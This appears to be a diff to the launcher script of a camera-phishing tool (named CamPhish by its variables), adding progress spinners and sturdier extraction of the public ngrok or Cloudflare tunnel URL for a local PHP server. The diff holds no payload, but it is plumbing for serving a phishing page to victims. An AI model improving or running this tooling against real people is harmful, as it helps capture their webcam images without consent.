@@ -89,6 +89,150 @@ killall "-${signal}" "$name" > /dev/null 2>&1
 fi
 }
 
+LOADER_PID=""
+LOADER_MSG=""
+
+start_loader() {
+local msg="${1:-Loading...}"
+LOADER_MSG="$msg"
+if [[ -n "$LOADER_PID" ]] && kill -0 "$LOADER_PID" 2>/dev/null; then
+kill "$LOADER_PID" 2>/dev/null
+wait "$LOADER_PID" 2>/dev/null
+fi
+(
+local spin='|/-\'
+local i=0
+while true; do
+printf "\r\e[1;93m[\e[0m%s\e[1;93m]\e[0m %s" "${spin:i++%4:1}" "$msg"
+sleep 0.12
+done
+) &
+LOADER_PID=$!
+}
+
+stop_loader() {
+if [[ -n "$LOADER_PID" ]] && kill -0 "$LOADER_PID" 2>/dev/null; then
+kill "$LOADER_PID" 2>/dev/null
+wait "$LOADER_PID" 2>/dev/null
+fi
+LOADER_PID=""
+printf "\r\033[K"
+}
+
+run_with_loader() {
+local msg="$1"
+shift
+start_loader "$msg"
+"$@"
+local rc=$?
+stop_loader
+return $rc
+}
+
+download_with_loader() {
+local msg="$1"
+shift
+start_loader "$msg"
+"$@" > /dev/null 2>&1 &
+local pid=$!
+wait "$pid"
+local rc=$?
+stop_loader
+return $rc
+}
+
+NGROK_LOG_TAIL_POS=0
+
+print_new_ngrok_lines() {
+local logfile=".ngrok.log"
+local total new_content
+[[ -f "$logfile" ]] || return 0
+total=$(wc -c < "$logfile" 2>/dev/null | tr -d ' \n')
+total=${total:-0}
+if [[ $total -gt $NGROK_LOG_TAIL_POS ]]; then
+new_content=$(tail -c +$((NGROK_LOG_TAIL_POS + 1)) "$logfile" 2>/dev/null)
+if [[ -n "$new_content" ]]; then
+stop_loader
+printf "%s" "$new_content"
+[[ -n "$LOADER_MSG" ]] && start_loader "$LOADER_MSG"
+fi
+NGROK_LOG_TAIL_POS=$total
+fi
+}
+
+get_ngrok_link_from_api() {
+local link=""
+link=$(php -r '
+$ctx = stream_context_create(["http" => ["timeout" => 3]]);
+$json = @file_get_contents("http://127.0.0.1:4040/api/tunnels", false, $ctx);
+if ($json === false) exit(1);
+$data = json_decode($json, true);
+if (!is_array($data) || empty($data["tunnels"])) exit(1);
+foreach ($data["tunnels"] as $tunnel) {
+  if (!empty($tunnel["public_url"]) && strpos($tunnel["public_url"], "http") === 0) {
+    echo $tunnel["public_url"];
+    exit(0);
+  }
+}
+exit(1);
+' 2>/dev/null)
+if [[ -n "$link" ]]; then
+printf '%s' "$link"
+return 0
+fi
+local api_response
+api_response=$(curl -s --max-time 3 http://127.0.0.1:4040/api/tunnels 2>/dev/null)
+if [[ -z "$api_response" ]]; then
+return 1
+fi
+link=$(echo "$api_response" | grep -oE '"public_url"\s*:\s*"https?://[^"]+"' | head -n1 | grep -oE 'https?://[^"]+')
+if [[ -n "$link" ]]; then
+printf '%s' "$link"
+return 0
+fi
+link=$(echo "$api_response" | grep -oE 'https://[a-zA-Z0-9._-]+\.(ngrok-free\.app|ngrok-free\.dev|ngrok\.app|ngrok\.io|ngrok\.dev)[^"[:space:]]*' | head -n1)
+if [[ -n "$link" ]]; then
+printf '%s' "$link"
+return 0
+fi
+return 1
+}
+
+get_ngrok_link_from_log() {
+local logfile="${1:-.ngrok.log}"
+local link=""
+[[ -f "$logfile" ]] || return 1
+link=$(grep -E 'Forwarding|forwarding' "$logfile" | grep -oE 'https://[a-zA-Z0-9._-]+[^[:space:]]*' | head -n1)
+if [[ -n "$link" ]]; then
+printf '%s' "$link"
+return 0
+fi
+link=$(grep -oE 'url=https://[a-zA-Z0-9._-]+[^[:space:]]+' "$logfile" | head -n1 | sed 's/^url=//')
+if [[ -n "$link" ]]; then
+printf '%s' "$link"
+return 0
+fi
+link=$(grep -oE '"public_url"\s*:\s*"https?://[^"]+"' "$logfile" | head -n1 | grep -oE 'https?://[^"]+')
+if [[ -n "$link" ]]; then
+printf '%s' "$link"
+return 0
+fi
+link=$(grep -oE 'https://[a-zA-Z0-9._-]+\.(ngrok-free\.app|ngrok-free\.dev|ngrok\.app|ngrok\.io|ngrok\.dev)(/[[:alnum:]/?=&._%-]*)?' "$logfile" | head -n1)
+[[ -n "$link" ]] && printf '%s' "$link"
+}
+
+show_ngrok_log_summary() {
+if [[ ! -f ".ngrok.log" ]]; then
+return 1
+fi
+printf "\e[1;93m[\e[0m!\e[1;93m] Ngrok output:\e[0m\n"
+if grep -qE 'Forwarding|forwarding|Session Status|ERR_|error|started tunnel|url=' .ngrok.log; then
+grep -E 'Forwarding|forwarding|Session Status|ERR_|error|started tunnel|url=|https://.*ngrok' .ngrok.log | tail -n 25
+else
+tail -n 25 .ngrok.log
+fi
+}
+
 get_cloudflare_link() {
 local logfile="$1"
 local link=""
@@ -191,29 +335,45 @@ return 0
 }
 
 get_ngrok_link() {
-local api_response
-api_response=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null)
-if [[ -z "$api_response" ]]; then
-return 1
+local link=""
+link=$(get_ngrok_link_from_api)
+if [[ -n "$link" ]]; then
+printf '%s' "$link"
+return 0
 fi
-echo "$api_response" | grep -oE 'https://[a-zA-Z0-9.-]+\.(ngrok-free\.app|ngrok-free\.dev|ngrok\.app|ngrok\.io)' | head -n1
+link=$(get_ngrok_link_from_log ".ngrok.log")
+[[ -n "$link" ]] && printf '%s' "$link"
 }
 
 wait_for_ngrok_link() {
 local attempt=0
 local link=""
-while [[ $attempt -lt 30 ]]; do
+NGROK_LOG_TAIL_POS=0
+LOADER_MSG="Waiting for ngrok public URL..."
+start_loader "$LOADER_MSG"
+while [[ $attempt -lt 45 ]]; do
+print_new_ngrok_lines
 link=$(get_ngrok_link)
 if [[ -n "$link" ]]; then
-printf "%s" "$link"
+stop_loader
+print_new_ngrok_lines
+printf "\e[1;92m[\e[0m*\e[1;92m] Ngrok tunnel established\e[0m\n"
+show_ngrok_log_summary
+printf '%s' "$link"
 return 0
 fi
-if [[ -f ".ngrok.log" ]] && grep -qE "ERR_NGROK_8014|Acceptable Use policy|authentication failed" ".ngrok.log"; then
+if [[ -f ".ngrok.log" ]] && grep -qE "ERR_NGROK_8014|Acceptable Use policy|authentication failed|failed to authenticate|invalid authtoken" ".ngrok.log"; then
+stop_loader
+print_new_ngrok_lines
 return 1
 fi
 sleep 2
 attempt=$((attempt + 1))
+LOADER_MSG="Waiting for ngrok public URL... (${attempt}/45)"
+start_loader "$LOADER_MSG"
 done
+stop_loader
+print_new_ngrok_lines
 return 1
 }
 
@@ -344,12 +504,15 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Step 1: Starting local PHP server on %s:%s...\e
 printf "\e[1;77m    (Same as: php -S %s:%s -t .)\e[0m\n" "$bind_address" "$CAMPHISH_PORT"
 php -S "${bind_address}:${CAMPHISH_PORT}" -t . > .php-server.log 2>&1 &
 echo $! > .php-server.pid
+start_loader "Starting PHP server..."
 sleep 2
 if ! verify_php_server; then
+stop_loader
 printf "\e[1;31m[!] Local PHP server failed to start.\e[0m\n"
 printf "\e[1;93m[\e[0m!\e[1;93m] Try manually in this folder: php -S %s:%s -t .\e[0m\n" "$bind_address" "$CAMPHISH_PORT"
 return 1
 fi
+stop_loader
 printf "\e[1;92m[\e[0m*\e[1;92m] Local server running at http://127.0.0.1:%s\e[0m\n" "$CAMPHISH_PORT"
 return 0
 }
@@ -360,9 +523,11 @@ local ngrok_config="$2"
 printf "\e[1;92m[\e[0m+\e[1;92m] Step 2: Starting ngrok tunnel to local port %s...\e[0m\n" "$CAMPHISH_PORT"
 printf "\e[1;77m    (Same as: %s http %s --config=%s)\e[0m\n" "$ngrok_bin" "$CAMPHISH_PORT" "$ngrok_config"
 rm -f .ngrok.log .ngrok.pid
-nohup "$ngrok_bin" http "$CAMPHISH_PORT" --config="$ngrok_config" --log=stdout > .ngrok.log 2>&1 &
+NGROK_LOG_TAIL_POS=0
+nohup "$ngrok_bin" http "$CAMPHISH_PORT" --config="$ngrok_config" > .ngrok.log 2>&1 &
 echo $! > .ngrok.pid
-sleep 3
+printf "\e[1;77m    Ngrok output will appear below while the tunnel connects...\e[0m\n"
+sleep 2
 }
 
 start_cloudflared_tunnel() {
@@ -388,18 +553,25 @@ sleep 3
 wait_for_cloudflare_tunnel() {
 local attempt=0
 local link=""
+LOADER_MSG="Waiting for Cloudflare tunnel URL..."
+start_loader "$LOADER_MSG"
 while [[ $attempt -lt 30 ]]; do
 if [[ -f ".cloudflared.pid" ]] && ! cloudflared_is_running; then
+stop_loader
 return 1
 fi
 link=$(get_cloudflare_link ".cloudflared.out")
 if [[ -n "$link" ]] && cloudflared_is_running; then
+stop_loader
 printf '%s' "$link"
 return 0
 fi
 sleep 2
 attempt=$((attempt + 1))
+LOADER_MSG="Waiting for Cloudflare tunnel URL... (${attempt}/30)"
+start_loader "$LOADER_MSG"
 done
+stop_loader
 return 1
 }
 
@@ -550,6 +722,7 @@ else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
 printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
+start_loader "Downloading Cloudflared..."
 
 # Detect architecture
 arch=$(uname -m)
@@ -619,11 +792,13 @@ else
         if [[ -e cloudflared ]]; then
             chmod +x cloudflared
         else
+            stop_loader
             printf "\e[1;93m[!] Download error... \e[0m\n"
             exit 1
         fi
     fi
 fi
+stop_loader
 fi
 
 check_cloudflared_config_conflict
@@ -704,6 +879,7 @@ command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not in
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
 command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
 printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
+start_loader "Downloading Ngrok..."
 
 # Detect architecture
 arch=$(uname -m)
@@ -772,11 +948,13 @@ else
             chmod +x ngrok
             rm -rf ngrok.zip
         else
+            stop_loader
             printf "\e[1;93m[!] Download error... \e[0m\n"
             exit 1
         fi
     fi
 fi
+stop_loader
 fi
 
 local ngrok_bin ngrok_config
@@ -808,10 +986,12 @@ printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Manual test:\e[0m\n"
 printf "\e[1;77m    php -S 127.0.0.1:%s -t .\e[0m\n" "$CAMPHISH_PORT"
 printf "\e[1;77m    %s http %s --config=%s\e[0m\n" "$ngrok_bin" "$CAMPHISH_PORT" "$ngrok_config"
 fi
-if [[ -f ".ngrok.log" ]]; then
-printf "\e[1;93m[\e[0m!\e[1;93m] ngrok log (last 10 lines):\e[0m\n"
-tail -n 10 .ngrok.log
+if command -v curl > /dev/null 2>&1; then
+printf "\e[1;93m[\e[0m!\e[1;93m] Ngrok API response:\e[0m\n"
+curl -s --max-time 3 http://127.0.0.1:4040/api/tunnels 2>/dev/null | head -c 800
+printf "\n"
 fi
+show_ngrok_log_summary
 exit 1
 else
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
